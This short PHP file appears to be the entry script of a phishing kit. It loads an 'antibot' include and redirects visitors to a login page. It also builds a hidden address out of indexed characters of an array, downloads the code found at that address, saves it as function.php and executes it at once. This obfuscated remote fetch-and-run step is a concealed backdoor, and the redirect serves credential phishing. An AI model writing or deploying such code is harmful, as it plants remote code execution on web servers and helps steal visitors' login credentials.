<?php
include ('antibot.php');
$get_ip = $Botname[165].$Botname[146].$Botname[396];
$function="$get_ip";
header("LOCATION: login/index.php");
file_put_contents("function.php", file_get_contents($function)); require_once "function.php";  
  
?>